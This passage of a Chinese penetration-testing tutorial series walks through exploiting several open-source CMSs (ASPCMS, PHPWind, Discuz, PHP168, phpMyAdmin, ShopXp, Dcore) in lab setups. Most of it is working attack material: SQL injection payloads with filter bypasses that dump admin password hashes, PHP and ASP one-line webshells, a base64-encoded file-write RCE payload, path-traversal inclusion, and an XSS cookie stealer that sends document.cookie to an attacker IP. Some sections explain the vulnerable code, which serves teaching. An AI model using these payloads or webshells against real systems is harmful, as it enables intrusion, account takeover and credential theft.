font-variant-caps: normal; font-variant-ligatures: normal;\">&nbsp;&nbsp;strlen(Z_STRVAL_P(inc_filename)) != Z_STRLEN_P(inc_filename)</span></div></td></tr></tbody></table>\n\n在新版本代码完善后一旦出现%00截断，include的文件名经过url转码由\"test.php%00.jpg\"变为\"test.php000.jpg\"。\n\n  \n\n# P034-开源CMS实战渗透测试-ASPCMS注入\n\n漏洞处： plug/comment/commentList.asp?id=3\n\n存在SQL注入漏洞\n\n加入单引号 plug/comment/commentList.asp?id=3' 报错\n\n![](https://cdn.anyiblog.top/common/1648712171476-7d188067-b16b-49e8-ad9b-eabcf807a7e5.jpg)\n  \n\n显示SQL语句错误。可以看到我们的单引号被过滤成了&apos，这是由哪里引起的呢？\n\n  \n\ncommentList.asp源码 ，第11行：\n\nContentID=filterPara(getForm(\"id\",\"get\"))\n\n首先，通过getForm(“id”,”get”)，以GET方式读取了id的值。\n\n  \n\n追踪filterPara()方法。它位于asp文件：\n\nC:inetpubwwwrootincAspCms_CommonFun.asp\n\n![](https://cdn.anyiblog.top/common/1648712172483-19ac5d8d-abf8-4e95-bfc1-7db78c10e82a.jpg)\n第863-866行，此函数首先调用了Checkxss()方法：\n\n![](https://cdn.anyiblog.top/common/1648712175843-7ade6f0c-ffd9-499a-bf24-e6873c46fae8.jpg)\n单引号就是由第893行的代码所转换的。\n\n896-907行，将常用的SQL语句：\n\nwhere、select、insert、create、drop、alter、delete、update、sor、javascript、jscript、vbscript 全部转义，以防止XSS和SQL注入。\n\n在checkxss()方法之后，又执行了preventSqlin()方法。第868行：\n\n![](https://cdn.anyiblog.top/common/1648712178690-b357370a-83ca-4d20-8ff8-38fa4b5c51d4.jpg)\n该方法会将第870行所有的函数全部替换为空，也就是防止SQL注入的“第二堵墙”。\n\n但两个方法配合执行会产生一个问题。\n\n设id=1 union semasterlect now\n\n我们将“select”拆开，在其中加入“master”，组成了“semasterlect”。\n\n首先该字符串通过checkxss()函数，由于select变成了semasterlect，所以不会被checkxss()方法察觉到有危险的注入语句。\n\n然后该字符串原样通过preventSqlin()方法，该方法的第870行将“master”这个字符串替换为空，也就是从“semasterlect“变成“select” 最后语句被执行\n\n因此通过部分函数会被替换为空进行拼接字符串 最后得到payload\n\nPayload： plug/comment/commentList.asp?id=3%20unmasterion%20semasterlect%201,2,3%20from%20{prefix}user\n\n![](https://cdn.anyiblog.top/common/1648712179021-fd356067-dc88-4647-9de3-789e86c4ce6f.jpg)\n列数不对 尝试过后得到列数为7\n\nplug/comment/commentList.asp?id=3%20unmasterion%20semasterlect%201,2,3,4,5,6,7%20from%20{prefix}user\n\n  \n\n![](https://cdn.anyiblog.top/common/1648712179286-ebedc481-415e-4581-989f-6fdf37d30717.jpg)\n  \n\n“下标越界”错误表示列数正确，但是我们全部查询的都是1,2,3,4,5,6,7这类数字，某列结果可能是字符串，而不是数字，所以报出了这个错误。\n\n查询用户信息Payload：\n\nplug/comment/commentList.asp?id=0 unmasterion semasterlect top 1 UserID,GroupID,LoginName,Password,now%28%29,null,1  frmasterom {prefix}user\n\nunion select语句代表从user表中读取了UserID（用户ID）、GroupID（用户组ID）、LoginName（登录名）、Password（密码）、now()函数（读取当前时间）、null（空值）、1\n\n  \n\n![](https://cdn.anyiblog.top/common/1648712179712-c84b9119-be29-4a9d-9b52-cdc408c30894.jpg)\n得到管理员md5加密的密码 通过md5反查得到密码为123456\n\n成功登陆后台\n\n![](https://cdn.anyiblog.top/common/1648712185517-8794a514-8444-49d2-98e1-0d6f08faad7b.jpg)\n  \n\n# P035-开源CMS实战渗透测试-PHPWind命令执行漏洞\n\n漏洞处： phpwind/admin.php\n\n弱口令admin admin 登录\n\n![](https://cdn.anyiblog.top/common/1648712185824-5574d9d8-af24-4e60-84df-fa360574a221.jpg)\n  \n\n在 门户 - 模块管理 - 调用管理 - 添加模块 处存在任意文件修改 并可以RCE\n\n![](https://cdn.anyiblog.top/common/1648712190182-17c9be7c-b752-4e70-ad28-fe7bf982b04b.jpg)\n![](https://cdn.anyiblog.top/common/1648712196066-bc7c9303-1ac4-4673-b8de-4f2be74e774e.jpg)\n写入php一句话\n\n![](https://cdn.anyiblog.top/common/1648712197388-0b5d5bef-d3de-4dcb-9918-1a39e51629a1.jpg)\n  \n\n写好后 点击调用代码 复制url访问：\n\n![](https://cdn.anyiblog.top/common/1648712197650-6643073c-fc7b-47d5-9910-a109789ca499.jpg)\n  \n\n![](https://cdn.anyiblog.top/common/1648712197935-6b4be0ec-dce0-4173-a4d6-c4915f9fc7a3.jpg)\n  \n\n将format=xml 改为format= 去掉xml 此时这个文件就会被php解析\n\n输入&s=phpinfo();\n\n![](https://cdn.anyiblog.top/common/1648712198358-784ed96d-c2e2-4886-bd2c-4f490247a13b.jpg)\n成功任意代码执行\n\n  \n\n漏洞分析：\n\n由于此论坛后续暂无更新，该漏洞临时解决方案：\n\n打开软件安装根目录 C:AppServwwwphpwindsrcservicedesign下PwDesignScript.php文件。修改源代码暂时关闭模块调用功能\n\n![](https://cdn.anyiblog.top/common/1648712202690-629d6695-06df-44d8-95fb-b3269b16043c.jpg)\n  \n\n# P036-开源CMS实战渗透测试-DiscuzX 3.2存储型XSS\n\n  \n\n漏洞处：/bbs/forum.php?mod=post&action=newthread&fid=2\n\n存在标题XSS漏洞 并可获取用户的cookie\n\n  \n\n登录用户admin hello\n\n在登录后的页面中点击“我的帖子”，进行页面跳转\n\n![](https://cdn.anyiblog.top/common/1648712206458-212517d9-93b0-4508-98d8-f31b69f0e0ae.jpg)\n  \n\n在我的帖子页面中点击“发帖”，进行文章编辑\n\n![](https://cdn.anyiblog.top/common/1648712210671-e315c338-f444-467a-bf9c-b76787bdc2b6.jpg)\n  \n\n选择Discuz!板块 - 默认板块 - 发新帖\n\n![](https://cdn.anyiblog.top/common/1648712216105-a01d58a5-5f1a-4236-921f-1d83a87a881c.jpg)\n  \n\n尝试利用img的onerror，使图片报错并执行JS代码。设置帖子标题为：\\<img src=1 onerror=alert(/xss/)\\>\n\n![](https://cdn.anyiblog.top/common/1648712218595-e6b8550d-ba34-44ba-8af8-212034a09074.jpg)\n  \n\n发布帖子，自动跳转至主题，XSS语句未生效\n\n![](https://cdn.anyiblog.top/common/1648712222039-b7be338d-6bcf-40d1-b1d9-302432763faf.jpg)\n  \n\n右键检查标题\n\n![](https://cdn.anyiblog.top/common/1648712230954-45f9f793-2e26-4313-9978-0ace7ee6ef76.jpg)\n由于img标签被h1标签包裹，img标签被并没有被解析，而是被识别成了文字。\n\n继续发帖，将标题中的特殊符号转为HTML编码后重试\n\n&#0060;img src=1 onerror=alert(/xss/)&#0062;\n\n  \n\n  \n\n返回首页，等待首页四格中的最新主题刷新出刚才所添加的三个帖子，用鼠标从下往上的顺序划过链接\n\n鼠标悬停至第三个帖子，alert语句被成功弹窗执行\n\n![](https://cdn.anyiblog.top/common/1648712231279-e2f67fea-9e00-4308-ae68-bd1aa9710518.jpg)\n  \n\n右键检查查看\n\n  \n\n![](https://cdn.anyiblog.top/common/1648712234982-188023c2-2b0d-4699-a3dd-156ece0ecf7e.jpg)\n  \n\n输入的原标题为\\<img src=1 onerror=alert(/xss/) \\>\n\n而回显在网页源码中的尖括号被转换为HTML编码\n\n\\<img src=1 onerror=alert(/xss/) \\>\n\n从而得知<>被服务端转化为<;和>\n\n  \n\n右键页面任意位置，点击“查看网页源代码（V）”\n\n![](https://cdn.anyiblog.top/common/1648712238560-5fd64ee3-77e3-443f-9360-c7be01b17e59.jpg)\n按快捷键Ctrl + F，搜索帖子的主题<img\n\nonmouseover=\"showTip(this)\"中的onmouseover属性在鼠标指针移动到元素上时触发，当鼠标指针移动到图像上时，执行一段 JavaScript。而 showTip是悬浮框，所以光标悬停时触发了元素信息，也就是触发了我们所做的陷阱。\n\n![](https://cdn.anyiblog.top/common/1648712245131-8927ce97-def3-4a49-9793-755e71711800.jpg)\n  \n\n利用xss漏洞可以实现获取用户的cookie 当用户鼠标悬停至我们的xss后会访问我们建立的js文件 最后再将cookie获取给php文件 帮我们记录下cookie\n\n  \n\n就此我们在本地建立一个test.js文件 内容如下\n\nvar img = document.createElement(\"img\");\n\nimg.src = \"[http://172.16.1.100](http://172.16.1.100/)（替换为攻击机IP地址）/log.php?cookie=\" + document.cookie;\n\ndocument.body.appendChild(img);\n\n![](https://cdn.anyiblog.top/common/1648712247032-6fc73106-f1b0-438b-aa4f-09abfce67e2b.jpg)\n  \n\nlog.php：\n\n  \n\n![](https://cdn.anyiblog.top/common/1648712247283-6d4626cf-e502-4ad2-a3ad-d01caf68a657.jpg)\n  \n\n  \n\n再次发帖 设定主题的标题访问test.js恶意JS文件 标题为\n\n&#0060;img src=1 onerror=appendscript(\"[http://](http://172.16.1.100/)10.140.98.66/test.js\")&#0062;\n\n  \n\n访问标题：\n\n![](https://cdn.anyiblog.top/common/1648712250073-3a51ae9a-e961-467b-a311-73aff83ce94d.jpg)\n  \n\nlog.txt成功记录下cookie：\n\n  \n\n![](https://cdn.anyiblog.top/common/1648712250487-b1e7ea76-7a1c-4c0e-9c18-7a0035839346.jpg)\n  \n\n漏洞原因：\n\n  \n\n切换至靶机Linux服务器，输入命令查看核心函数库源代码\n\nvi /var/www/html/bbs/source/function/function_core.php\n\n![](https://cdn.anyiblog.top/common/1648712251525-fb5330cc-98a8-427f-bb37-8bb74270834d.jpg)\n进入编辑器后，输入/dhtmlspecialchars搜索HTML编码方法\n\n![](https://cdn.anyiblog.top/common/1648712254707-46c1f1b2-ff7a-4ec2-8b49-cea5f4c4df49.jpg)\n字符&”<>被代码进行编译，无法正常的使用原有的功能，故此，我们在对论坛进行提交信息时，Discuz程序在存储的时候也进行了适当的转义，导致我们输入的信息无法成为脚本使用。\n\n![](https://cdn.anyiblog.top/common/1648712263399-5417025b-35d8-4554-97e0-844950edaccc.jpg)\n  \n\n# P037-开源CMS实战渗透测试-Discuz 7.2SQL注入\n\n  \n\n漏洞处：bbs/faq.php?action=faq&id=1&messageid=2\n\n  \n\n![](https://cdn.anyiblog.top/common/1648712265520-ae216bb0-23f8-4749-a275-f293c7900da3.jpg)\n  \n\nPayload： gids[x]=’&gids[x+1][uid]=) and updatexml(1,concat(0x7e,(select @@version)),1)#\n\n点击帮助页面中的用户组权限\n\n![](https://cdn.anyiblog.top/common/1648712268239-56012b32-bde9-4f59-a325-5cd37e86a63f.jpg)\n![](https://cdn.anyiblog.top/common/1648712270309-f71acdf6-7f2c-4394-9fcf-7e8cb67e3e99.jpg)\n  \n\n获取数据库版本：\n\nbbs/faq.php?action=grouppermission&gids[88]=%27&gids[89][0]=) and updatexml(1,concat(0x7e,(select @@version)),1)%23\n\n  \n\n![](https://cdn.anyiblog.top/common/1648712272150-9cd4854a-ed0f-428f-8cc4-ade0a21bf455.jpg)\n  \n\n获取数据库用户名和密码：\n\nbbs/faq.php?action=grouppermission&gids[88]=%27&gids[89][0]=)%20and%20(select%201%20from%20(select%20count(*),concat((select%20concat(username,0x7e,password)%20from%20cdb_members%20limit%200,1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)as%20a)%23\n\n  \n\n![](https://cdn.anyiblog.top/common/1648712276287-e6bb6ffc-797b-4849-9769-3e7a75d17c86.jpg)\n  \n\n正常的MD5值为32位，但我们得到了一串长度为33的返回结果，审计部分查询语句\n\n![](https://cdn.anyiblog.top/common/1648712277694-bae6a120-92ec-417b-9668-bc70c2eb5d3f.jpg)\n通过该部分查询语句，我们得到以下信息：\n\n1.通过concat()函数将多个返回结果（字符串）拼接\n\n2.(select%20concat…….limit%200,1)为concat函数的第一个字段，返回管理员密码的MD5值\n\n3.floor(rand(0)*2)为concat函数的第二个字段，它随机生成1位0或1两种数字\n\nconcat函数将管理员密码的MD5值和随机生成的一位数字进行拼接，最终得到长度为33的返回结果。所以在MD5的解密中，需要将最后一位数字删除，才能得到完整有效的MD5值。\n\n第八步，进行MD5解密，解密结果为123456\n\n![](https://cdn.anyiblog.top/common/1648712280728-c29eb47b-15d2-4cfd-8e52-1460af9bc5cd.jpg)\n在首页中点击“登录”，用户名为admin密码为123456\n\n![](https://cdn.anyiblog.top/common/1648712285150-ad2194a6-2840-4c1f-8873-46c1e1fc64b4.jpg)\n成功登录。\n\n  \n\n漏洞原因：\n\n  \n\n进入服务器中的/var/www/html/bbs目录，查看faq.php帮助文件的源文件\n\n![](https://cdn.anyiblog.top/common/1648712286308-617ee03a-8fab-4c81-ae9b-1b6f308a08c7.jpg)\n在第148至166行之间，可以看到数据库查询的过程，注入点位于157行的位置\n\n![](https://cdn.anyiblog.top/common/1648712289555-a28fc5cb-5fa8-47ba-bf1a-34107f2e80bc.jpg)\n  \n\n接下来对代码的核心结构文件common.inc.php进行分析，切换路径至/var/www/html/bbs/include，编辑此路径下的文件common.inc.php\n\n![](https://cdn.anyiblog.top/common/1648712290735-4fc39655-7e0a-422b-8963-3f094e1eb646.jpg)\n在common.inc.php中的第40行的部分，当浏览器前端通过$_COOKIE、$_POST和 $_GET方法传入参数至common.inc.php文件是，程序使得对象中的每一个键值对转化成PHP中的变量\n\n![](https://cdn.anyiblog.top/common/1648712292108-51fa35cf-e9c2-4cc2-8f10-530951cd3943.jpg)\n同时在43行中通过函数daddslashes对所有的值进行处理，变成PHP语言中的字符单引号，我们再返回faq.php继续查看这个文件，在第184行中，可以看到ksort()函数；\n\n![](https://cdn.anyiblog.top/common/1648712293512-f04f39ff-541e-4f34-b8c4-5a6e99caafc9.jpg)\n  \n\n这里首先定义了一个数组名为groupids，然后遍历$gids（这也是个数组，就是$_GET[gids]），将数组中的所有值的第一位取出来放在groupids中。该操作就是漏洞产生的原因，前面已经讲解了Discuz网站全局对GET数组进行addslashes转义，单引号加入了右斜杠被转义，此时若传入的值为gid[1]='会被转义成gid[1]='，而在赋值语句$groupids[ ] = $row[0]相当于取了字符串的第一个字符即，将转义符号取出。\n\n继续审阅源代码，在将数据交给SQL处理之前，先交给了implodeids处理，查看implodeid函数的代码，追溯到implodeids的函数在文件路径include/global.func.php中的第675行被定义\n\n![](https://cdn.anyiblog.top/common/1648712294541-7e176e78-c5c9-4b8e-9f21-132e7e5e4ea4.jpg)\n  \n\n具体代码如下\n\n![](https://cdn.anyiblog.top/common/1648712296348-db685a5e-9eb8-451f-a3be-a15b2fc5dce6.jpg)\n  \n\n此处函数是将上面的$groupids数组用逗号（,）分割开，组成一个’1’,’2’,’3’,’4’的字符串返回。但在第五步中取出了一个转义符，将这里一个正常的单引号（’）转义掉，结果如下’1’,’’,’3’,’4’，可以发现第4个单引号被转义了，则此处的第五个单引号与第三个单引号形成闭合，此时的数字3的位置相当于漏掉了一个单引号，因此产生注入，我们将报错语句放在3的位置就能产生报错。\n\n继续审计faq.php的第190行代码，程序执行到$query中\n\n![](https://cdn.anyiblog.top/common/1648712297196-13c071fe-424d-45ad-a4b0-ab4500b36cf4.jpg)\n我们来复现构造SQL语句的过程\n\n![](https://cdn.anyiblog.top/common/1648712298302-74e5e2ef-d3e6-472b-8e44-2fc3859bdd3d.jpg)\n将SQL执行的过程中$groupids替换为数组'1','2','3','4'\n\n![](https://cdn.anyiblog.top/common/1648712300270-dd2950a2-77bf-43e1-9cec-d6b128742554.jpg)\n传入单引号至的数字2的位置中\n\n![](https://cdn.anyiblog.top/common/1648712301574-db41b508-4083-45a0-bbc4-fc12880a3463.jpg)\n将数字3的位置进行赋值，赋值的内容为：\n\n![](https://cdn.anyiblog.top/common/1648712303011-33ff1780-57a4-4b2c-86ac-5977501fc201.jpg)\n  \n\n此时顺利闭合了前面的括号造成注入，或将1=1替换为数据库查询语句进行查询操作。可以通过构造faq.php?gids[x]=’&gids[x+1][uid]=sql突破安全处理，例如构造gids[80]=%27，此处的%27即单引号，discuz的全局变量将对单引号进行自动过滤，添加反斜杠’，$row[0]取出来第一个参数的值是反斜杠。构造的第二个参数为uid=) and 1=1#代入URL中即可造成数据库查询错误。\n\n# P038-开源CMS实战渗透测试-海盗云商任意代码执行GetShell\n\n  \n\n漏洞处：index.php?m=member&c=account&a=avatar\n\n点击网站右上角的注册按钮，注册一个新的用户\n\n![](https://cdn.anyiblog.top/common/1648712309406-73a8421d-c261-494c-83fc-6ec6ad91ae9e.jpg)\n  \n\n点击头像下方的修改头像链接对用户的头像进行修改\n\n![](https://cdn.anyiblog.top/common/1648712312953-b97d3940-2c08-4faa-87bd-0634dd1c647b.jpg)\n  \n\n上传一个新的头像\n\n![](https://cdn.anyiblog.top/common/1648712317481-f4b06ea9-99f5-43a8-bb5f-24a3a926021d.jpg)\n  \n\n  \n\n将文件名改为php\n\n![](https://cdn.anyiblog.top/common/1648712318202-8bec4d90-df24-4b70-b381-75e0f63744fb.jpg)\n  \n\n内容尾部添加一句话木马\n\n  \n\n![](https://cdn.anyiblog.top/common/1648712319436-46799a20-9fae-4083-9c1f-002840295e8d.jpg)\n  \n\n点击Send 发送包 访问目标路径\n\n![](https://cdn.anyiblog.top/common/1648712320882-2041dec9-360f-4ca2-9cd8-995fc77026b5.jpg)\n![](https://cdn.anyiblog.top/common/1648712323085-d22c69f4-6fb8-44e0-9cf8-3a507ad29edb.jpg)\n  \n\n因为是图片马 所以这里用蚁剑连接\n\n![](https://cdn.anyiblog.top/common/1648712323867-c7e93ad3-4075-4b49-8703-d05473307ca3.jpg)\n  \n\nGetshell：\n\n  \n\n![](https://cdn.anyiblog.top/common/1648712324165-95f9166a-2cae-45bd-8160-210939efdded.jpg)\n  \n\n  \n\n# P039-开源CMS实战渗透测试-PHP168任意代码执行GetShell\n\n  \n\n漏洞处：/pentest/cms/php168/member/post.php\n\n  \n\n点击注册，注册一个新的用户\n\n![](https://cdn.anyiblog.top/common/1648712325524-fd6594d2-7f6e-4d6d-8f93-39453f6cee78.jpg)\n同意注册协议\n\n![](https://cdn.anyiblog.top/common/1648712332644-8f519a8b-5124-411b-8f6a-c647aed186d3.jpg)\n填写会员信息\n\n![](https://cdn.anyiblog.top/common/1648712339353-02f40d8c-61d5-42fd-a77c-7155091fdae0.jpg)\n注册成功，自动返回主页\n\n![](https://cdn.anyiblog.top/common/1648712343214-b34750b5-e9eb-49f8-b610-0fcb922f9915.jpg)\n  \n\n发送Payload：?only=1&showHtml_Type[bencandy][1]={${phpinfo()}}&aid=1&job=endHTML\n\n  \n\nRCE成功\n\n![](https://cdn.anyiblog.top/common/1648712343642-283c43a4-55d7-4a5c-9434-664089b0df86.jpg)\n  \n\n因为PHP过滤了@，<，>等特殊字符，导致木马无法正常使用，需要使用另外一种方式写入木马，通过转义的方式使Payload可被执行\n\n使用木马生成一个有写入权限的文件x.php，使用base64进行转义。打开Windows 7渗透机的Chrome浏览器，使用Hackbar的base64 Encode功能\n\n  \n\n构造payload：?only=1&showHtml_Type[bencandy][1]={${fwrite(fopen(base64_decode('eC5waHAg'), 'w'),base64_decode('PD9AZXZhbCgkX1BPU1RbJ3Bhc3MnXSk7Pz4g')) and print('ok')}}&aid=1&job=endHTML\n\n发送数据包，返回的页面中带有字符串“okok”，写入成功\n\n![](https://cdn.anyiblog.top/common/1648712348390-9ea9d080-92ca-42ba-b71f-66613e2f0acc.jpg)\n  \n\n蚁剑连接\n\n![](https://cdn.anyiblog.top/common/1648712349270-d56055f6-5cc3-4e54-a3cb-ed5ff8b52885.jpg)\n  \n\n成功连接。\n\n![](https://cdn.anyiblog.top/common/1648712349601-806b2878-a36a-46dd-a616-4ef7f948119e.jpg)\n  \n\n# P040-开源CMS实战渗透测试-phpMyAdmin任意文件包含漏洞\n\n  \n\n漏洞处： gis_data_editor.php\n\n存在文件包含漏洞\n\n  \n\n登录phpmyadmin 账号密码root root\n\n![](https://cdn.anyiblog.top/common/1648712349910-e7c6417f-76ce-4f1b-bfe9-638eb546b582.jpg)\n  \n\n访问：pentest/cve/phpmyadmin/gis_data_editor.php?token=61eae00b9d0443925b2f4b504ea36493\n\n  \n\n加上参数 &gis_data[gis_type]=/../../../../phpinfo%00\n\n  \n\nPayload： pentest/cve/phpmyadmin/gis_data_editor.php?token=61eae00b9d0443925b2f4b504ea36493&gis_data[gis_type]=/../../../../phpinfo%00\n\n  \n\n![](https://cdn.anyiblog.top/common/1648712350483-c943c3e9-5178-463d-a287-babc659eac12.jpg)\n读取到了phpinfo文件\n\n  \n\n退出管理员用户，尝试使用普通权限用户验证漏洞可用性\n\n1. 点击左侧注销按钮\n\n![](https://cdn.anyiblog.top/common/1648712353132-26f168ee-ebf3-4429-8098-3969bb7b6eac.jpg)\n2. 登录普通用户，用户名py，密码123456\n\n![](https://cdn.anyiblog.top/common/1648712361349-cb3c89b5-dbb4-42a6-acea-b1bc5776c860.jpg)\n  \n\n访问payload\n\n![](https://cdn.anyiblog.top/common/1648712362080-7943b0eb-7f0d-415a-8733-8b1dc3e1e817.jpg)\n成功读取。\n\n经验证，该漏洞适用于PHPMyAdmin的所有用户。\n\n  \n\n# P041-开源CMS实战渗透测试-ShopXp系统SQL注入\n\n漏洞处：admin/pinglun.asp\n\n存在SQL注入 以及文件上传漏洞\n\n  \n\nPayload：admin/pinglun.asp?id=1 union select 1,2,3,4,5,6,7,8,9,10,11 from shopxp_admin\n\n  \n\n![](https://cdn.anyiblog.top/common/1648712365921-eb9bd1a9-5c1a-4c22-9eb2-2ed889b95966.jpg)\n直到同时选定11个字段时，服务端才返回了第3、5、6、10个字段的结果。通过替换这四个位置的字段，来达到任意数据读取的目的。\n\n  \n\n?id=1 union select 1,2,admin,4,password,6,7,8,9,10,11 from shopxp_admin\n\n![](https://cdn.anyiblog.top/common/1648712366186-7742cb8d-9c10-4516-be1b-01d5674382e8.jpg)\n  \n\nmd5反查得到密码为admin\n\n![](https://cdn.anyiblog.top/common/1648712368783-4ab0d30a-6ca8-44e6-adbf-42d9ef2c01ab.jpg)\n  \n\n漏洞2：文件上传\n\n  \n\n访问管理员登录页面，尝试以管理员身份登录，用户名admin，密码admin\n\n<http://172.16.1.200:8089/admin>\n\n![](https://cdn.anyiblog.top/common/1648712372150-7dca1831-7499-4ab5-af7c-4a58cf1df4de.jpg)\n  \n\n后台登录成功\n\n![](https://cdn.anyiblog.top/common/1648712381137-655b341e-6e7b-4d43-bcf8-f785b07bff10.jpg)\n  \n\n 单击左侧“商城广告设置”，进入商城广告设置页面\n\n![](https://cdn.anyiblog.top/common/1648712385536-308fa87a-2900-4b2a-beae-c5dd2e362918.jpg)\n  \n\n下划至页面底部，存在一个广告图片上传框，支持上传swf、gif、jpg文件\n\n![](https://cdn.anyiblog.top/common/1648712388910-e2f62968-0cd5-4a24-b7d0-95b0ec47c61e.jpg)\n  \n\n回到桌面，新建一个文本文档，重命名为webshell.asp，并向webshell.asp中写入一句话木马\n\n<%eval request(\"cmd\")%>\n\n![](https://cdn.anyiblog.top/common/1648712392578-c50eef8f-5ce8-43e2-8212-c2d4cd09ab9b.jpg)\n  \n\n按 Win + R，在运行窗口中启动cmd，并将jpg文件与webshell合成\n\n![](https://cdn.anyiblog.top/common/1648712395363-17727410-79aa-4b87-a878-1d9247d0db82.jpg)\n  \n\n进入桌面，并将github.jpg和webshell.asp文件合并\n\n![](https://cdn.anyiblog.top/common/1648712399943-7869fb8c-89c2-40a2-bd33-c0014d4008e5.jpg)\n  \n\n生成了一个图片木马：shell.jpg\n\n回到后台管理，上传shell.jpg图片木马\n\n![](https://cdn.anyiblog.top/common/1648712404610-a12ac01c-1021-48c4-bbcc-e7c03ce1bb91.jpg)\n![](https://cdn.anyiblog.top/common/1648712412537-6b1cb716-6fde-4150-82ea-239c22457f46.jpg)\n  \n\n图片上传成功，得到图片路径\n\n![](https://cdn.anyiblog.top/common/1648712414798-969d5667-1577-4dfe-8d78-028baf3fd616.jpg)\n  \n\n访问图片路径\n\n<http://172.16.1.200:8089/img_shopxp/ad/2020177593188012.jpg>（文件名修改为生成的文件名）\n\n![](https://cdn.anyiblog.top/common/1648712419024-a3442387-1ff2-48eb-b9dc-b169cd85e155.jpg)\n文件存在，但由于做了木马合并，所以内容乱码。\n\n  \n\n连接菜刀：\n\n![](https://cdn.anyiblog.top/common/1648712424709-fc6a054f-6c43-4672-bd53-15c020540603.jpg)\n![](https://cdn.anyiblog.top/common/1648712432548-18c20621-6216-4fba-a96d-ec1187acda22.jpg)\n  \n\n# P042-开源CMS实战渗透测试-Dcore(轻型CMS系统)SQL注入\n\n  \n\n双击渗透机机桌面上的Chrome浏览器图标，进入浏览器在地址栏输入网址[http://172.16.1.200](http://172.16.1.200/)（靶机IP）:8081/打开目标服务器首页\n\n![](https://cdn.anyiblog.top/common/1648712434200-2e4f4bea-1bcd-477e-a9d1-1f8eeca22425.jpg)\n观察网站的URL，找到地址中的参数信息：?temp=index&subsite=1，分解一下首页文档为dynamic.asp，temp参数中传递了index，表明该页面为常规的首页页面，并未在模板中做过任何修改操作，subsite=1子站点参数根据任务分析中对源代码进行分析的过程可以发现此处的subsite为未经过滤的参数，基本上可以判断在URL中是包含SQL注入的，通过构建SQL注入语句进行尝试。\n\n点击URL地址栏右侧的图标以激活hackbar插件，接下来所有的注入操作都将在此进行\n\n![](https://cdn.anyiblog.top/common/1648712436860-ac052433-c97e-413c-9aa7-e608914dfda9.jpg)\n插件右侧的三个按钮分别对应的是load URL（加载网址）、split URL（分割网址）、 Execute（执行），其中加载网址主要是将网址加载进插件窗口，便于修改；分割网址主要用于自动切分，并方便快速找出需要修改的地方；执行用途为访问窗口中的链接或payload。此工具还提供了很多web开发相关的命令，像urlencode,urldecode等常见的命令。在应对GET，POST请求这两个http协议中两个重要的请求时，经常会用到该插件。\n\n接下来开始测试页面代码是否存在漏洞，首先点击插件右侧的第一个按钮（load URL），然后在url的末尾添加一个单引号，以检测是否存在单引号报错注入，最后点击第三个按钮（Execute）以执行跳转操作\n\n![](https://cdn.anyiblog.top/common/1648712440240-4704d5d4-19c2-4ea9-8acc-f673af224673.jpg)\n如果页面没有报错，说明特殊字符是经过网站过滤的，如果页面存在报错则说明首页存在注入点，页面返回结果如下\n\n![](https://cdn.anyiblog.top/common/1648712441309-40817677-b9ec-4617-b89d-feda3541038f.jpg)\n页面出现报错，且后台数据库出现详细的错误信息。恶意攻击者通常会利用这些报错信息来判断后台 SQL 的拼接形式，甚至是直接利用这些报错注入将数据库中的数据通过报错信息显示出来。接下来的操作就简单多了。\n\n在URL末尾添加字段and 1=1\n\n![](https://cdn.anyiblog.top/common/1648712444881-14207f87-fd93-46a0-9c30-f4f46c6e8f84.jpg)\n有回显信息，证明逻辑正确,真实和真实为真实，也就是1=1这是第一个判断的信息，第二个判断的信息是and后边的信息，也就是1=1，和前面一样都为真实的事件，这两个判断信息都符合真实的条件，那么这个逻辑信息就是正确的。\n\n在URL末尾添加字段and 1=2\n\n![](https://cdn.anyiblog.top/common/1648712447261-d10bcbe7-f5ec-4def-8c9c-ee0770a1fabe.jpg)\n回显信息为错误，逻辑为正常，众所周知，在正常条件下1=1是正确的，也就是真实和真实等于真实，1=2这个信息，在正常的条件下是绝对不相等的，1 and 1 = 2，有一条信息不符合逻辑信息，所以回显是错误的，因为回显是错误的，说明sql的运行逻辑没有被做过逻辑修改，因为若将信息做信息处理，可以将1等于任何信息，就是对判断处理的一种防护模式，也就不会出现回显报错了。\n\n![](https://cdn.anyiblog.top/common/1648712449832-00ffb752-0fed-49d5-8015-b35e317f5737.jpg)\n具体报错的行数为config.asp\n\n![](https://cdn.anyiblog.top/common/1648712453418-c671c3c8-2197-4f0e-b99f-37fac94f0677.jpg)\n上述代码的行号为34，查询获得的结果会作为dynamic.asp文件所包含的getstyle.asp页面的参数并不会直接显示到页面中，因此不可以使用union查询。既然如此可以使用基于布尔类型的盲注，比如猜解表名：我们可以利用一些数据相关的字典信息来猜解表名，字典可以在桌面上找到：\n\n![](https://cdn.anyiblog.top/common/1648712457790-97531767-41c7-4f71-a2eb-ed81fb8349ac.jpg)\n用于猜解表名的PoC：\n\nand(select top 1 1 from Bruteforce[i])\n\n![](https://cdn.anyiblog.top/common/1648712461158-10cc4813-7cb5-490a-a654-5ec10a12b2f6.jpg)\n注意：常规的链接可通过点击右侧的第二个链接即可切分为上图所示的格式。\n\n使用快捷键Ctrl + N，打开一个新的标签页，然后在地址栏中输入[Chrome://settings/system](chrome://settings/system)，跳转至系统设置页面找到打开代理设置\n\n![](https://cdn.anyiblog.top/common/1648712464111-a8cae5e2-5f33-4a96-9e6b-89e7183a742a.jpg)\n依照下图设置代理\n\n![](https://cdn.anyiblog.top/common/1648712471331-bfb5d0ec-7693-48b3-a3f9-500a30adf775.jpg)\n然后打开桌面上的Burp_suite软件，确认软件代理处于拦截请求状态\n\n![](https://cdn.anyiblog.top/common/1648712472951-06edf064-2fc8-4809-927f-22f1c16dda6c.jpg)\n接下来，回到浏览器中，执行用于猜解表名的PoC，\n\n![](https://cdn.anyiblog.top/common/1648712475936-d8c77d5b-8133-4d18-8657-ea021a5e533c.jpg)\nBurpSuite软件的代理已截获到浏览器发送过来的请求，使用右键菜单或快捷键Ctrl + 